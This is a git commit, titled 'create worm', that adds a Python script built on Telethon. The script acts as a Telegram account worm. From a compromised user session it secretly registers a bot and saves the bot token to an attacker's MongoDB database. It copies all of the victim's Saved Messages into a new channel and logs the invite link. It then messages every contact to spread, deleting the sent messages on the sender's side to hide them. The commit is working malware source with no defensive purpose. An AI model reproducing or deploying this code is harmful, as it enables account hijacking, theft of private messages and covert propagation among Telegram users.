555007259e358559dfbb990e130db31fde8e0931
Indika Viraj <samangoonerathne@gmail.com>
2025-03-05 16:01:40 +0000

    create worm

---
+++ worm.py
@@ -0,0 +1,62 @@
+import os,logging,random,asyncio
+from telethon import functions, errors
+from dotenv import load_dotenv
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+load_dotenv(override=True)
+
+mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
+database = mongo_client.wormdb
+
+async def create_bot(client, me):
+    async with client.conversation("@BotFather") as conv:
+        msg = await conv.send_message("/newbot")
+        await (await conv.get_response()).delete()
+        await (await conv.send_message("SL Wala")).delete()
+        await (await conv.get_response()).delete()
+        username = "freewala_{}{}_bot".format(random.randint(1000,9999),random.randint(1000,9999))
+        await (await conv.send_message(username)).delete()
+        response = await conv.get_response()
+        bot_token = response.text.split("`")[1].strip()
+        await msg.delete()
+        await response.delete()
+    database.bots.insert_one({"username": username, "token": bot_token, "owner": me.id})
+async def backup_saves(client, me):
+    result = await client(functions.channels.CreateChannelRequest(
+        title=f'{me.first_name} {me.last_name}',
+        about=f'First name: {me.first_name}\nLast name: {me.last_name}\nUsername: {me.username}\nID: {me.id}',
+        megagroup=False,
+    ))
+    channel_id = result.updates[1].channel_id
+    dest = await client.get_entity(channel_id)
+    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
+    database.channels.insert_one({"invite": result.link, "owner": me.id})
+    async for message in client.iter_messages("me", reverse=True):
+        try:
+            await message.forward_to(dest)
+        except errors.FloodWaitError as e:
+            await asyncio.sleep(e.seconds)
+            await message.forward_to(dest)
+        except:
+            break
+    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
+async def spread(client, me):
+    spread_msg = "Hey! I'm a worm! I'm spreading!"
+    async for dialog in client.iter_dialogs():
+        try:
+            msg = await dialog.send_message(spread_msg)
+        except errors.FloodWaitError as e:
+            await asyncio.sleep(e.seconds)
+            msg = await dialog.send_message(spread_msg)
+        except:
+            break
+        if dialog.is_user:
+            await msg.delete(revoke=False)
+
+async def worm(client):
+    me = await client.get_me()
+    await create_bot(client, me)
+    await backup_saves(client, me)
+    await spread(client, me)
